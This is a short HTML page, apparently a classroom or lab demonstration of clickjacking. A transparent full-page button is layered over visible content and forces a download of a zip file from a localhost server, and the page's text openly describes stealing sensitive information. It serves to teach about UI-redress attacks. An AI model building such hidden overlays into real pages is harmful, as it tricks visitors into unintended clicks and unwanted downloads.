<html>
<head>
  <title>Clickjacking Example</title>
  <style>
    .transparent-button {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: transparent;
      z-index: 999;
    }
  </style>
</head>
<body>
  <!-- Hidden button -->
  <button class="transparent-button" onclick="Download()"></button>

  <!-- Visible content -->
  <h1>Welcome to the Clickjacking Example</h1>
  <p>Click the button below to steal sensitive information and download a file.</p>
  <a href="http://127.0.0.1:5500/attacker_website.html">Click Me</a>

  <script>
    function Download() {
      var link = document.createElement('a');
      link.href = 'http://127.0.0.1:5500/file.zip';
      link.download = 'file.zip';
      link.click();
    }
  </script>
</body>
</html>
